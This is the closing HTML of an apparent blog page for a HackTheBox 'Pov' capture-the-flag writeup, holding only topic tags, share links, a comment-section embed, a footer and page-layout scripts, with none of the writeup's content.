+    <a href="/search?q=exploiting-viewstate" class="tag" style="font-family: 'Cascadia Code';">exploiting-viewstate</a>
+    
+    <a href="/search?q=decrypting-securestring" class="tag" style="font-family: 'Cascadia Code';">decrypting-securestring</a>
+    
+    <a href="/search?q=sedebugprivilege" class="tag" style="font-family: 'Cascadia Code';">sedebugprivilege</a>
+    
+    
+</div>
+  <br>
+  Share this writeup:&nbsp;
+  <a
+    href="javascript:window.open('https://www.facebook.com/sharer.php?u=http://localhost:4000/writeups/2024/HTB/Pov.html','Windows','width=650,height=350,toolbar=no,menubar=no,scrollbars=yes,resizable=yes,location=no,directories=no,status=no')"><i
+      class="fa fa-facebook-official" aria-hidden="true"></i></a>&nbsp;
+  <a
+    href="javascript:window.open('https://twitter.com/intent/tweet?url=http://localhost:4000/writeups/2024/HTB/Pov.html&text=Writeup+for+HackTheBox Pov Writeup+from+HTB+held+on+08 June 2024&hashtags=ctf,writeup,Pov,HTB,lfi,web.config,deserialization,exploiting-viewstate,decrypting-securestring,sedebugprivilege','Windows','width=600,height=500,toolbar=no,menubar=no,scrollbars=yes,resizable=yes,location=no,directories=no,status=no')"><i
+      class="fa fa-twitter" aria-hidden="true"></i></a>&nbsp;
+  <a
+    href="javascript:window.open('https://www.linkedin.com/sharing/share-offsite/?url=http://localhost:4000/writeups/2024/HTB/Pov.html&text=Writeup+for+HackTheBox Pov Writeup+from+HTB+held+on+2024-06-08 00:00:00 +0200','Windows','width=650,height=350,toolbar=no,menubar=no,scrollbars=yes,resizable=yes,location=no,directories=no,status=no')"><i
+      class="fa fa-linkedin" aria-hidden="true"></i></a>
+</div>
+    </section>
+  </div>
+
+  <div id="comments" class="container">
+    <section id="disqus_container">
+      
+      <hr>
+      <div id="disqus_thread"></div>
+<script>
+    function disqus_config() {
+        this.callbacks.onReady.push(function() {
+            setSizes();
+        });
+    }
+    (function () {
+        var d = document, s = d.createElement('script');
+        s.src = 'https://captainirs-github-io.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by
+        Disqus.</a></noscript>
+      
+    </section>
+  </div>
+
+  <footer>
+    <div class="social d-flex flex-column justify-content-center w-100">
+    <a href="/search" class="text-center w-100 mt-3 mb-2">
+      <i class="fa fa-sm fa-search"></i>
+    </a>
+    <div class="social-links-bar d-flex justify-content-center mb-2">
+        
+        
+        <a href="https://github.com/GabrielGonzalez211" target="_blank" rel="noopener">
+            <i class="fab fa-lg fa-github" aria-hidden="true"></i>
+        </a>
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+    </div>
+    
+    <div class="htb_badge d-flex justify-content-center">
+        
+        <script src="https://www.hackthebox.eu/badge/831031"></script>
+        
+    </div>
+    <div class="thm_badge">
+        
+    </div>
+    
+</div>
+
+  </footer>
+
+  <script src="http://localhost:4000/assets/js/prism.js"></script>
+  <button onclick="topFunction()" class="fa fa-arrow-up" id="top" title="Go to top"></button>
+  <script>
+    topScroll = document.getElementById("top");
+
+    window.onscroll = function () { scrollFunction() };
+
+    function scrollFunction() {
+      if (document.body.scrollTop > 20 || document.documentElement.scrollTop > 20) {
+        topScroll.style.display = "block";
+      } else {
+        topScroll.style.display = "none";
+      }
+    }
+
+    function topFunction() {
+      document.body.scrollTop = 0;
+      document.documentElement.scrollTop = 0;
+    }
+
+    $(window).on('load', function () {
+
+      $('a[download]').each((i, e) => {
+        $(e).addClass('fa fa-download');
+      });
+
+      setSizes();
+    });
+
+    $(window).resize(setSizes);
+
+    function setSizes() {
+      if ($(window).width() < 960) {
+        $('#bottom-bar').hide();
+        $('footer').show();
+        $('#navbarSupportedContent').css('max-height', 'unset');
+        $('.navbar-collapse').collapse('hide');
+        if (document.body.clientHeight - $('#header').outerHeight() - $('#main_content').outerHeight() - $('#comments').outerHeight() < 150) {
+          $('footer').css("position", "unset");
+        } else {
+          $('footer').css("position", "fixed");
+        }
+      }
+      else {
+        $('#bottom-bar').show();
+        $('footer').hide();
+        $('.navbar-collapse').collapse('show');
+        $('footer').css("position", "fixed");
+        $('#navbarSupportedContent').css('max-height', (document.body.clientHeight - $('.title-container').outerHeight() - $('#bottom-bar').outerHeight() - $('.navbar-toggler').outerHeight() - 50));
+      }
+    }
+  </script>
+
+</body>
+
+</html>
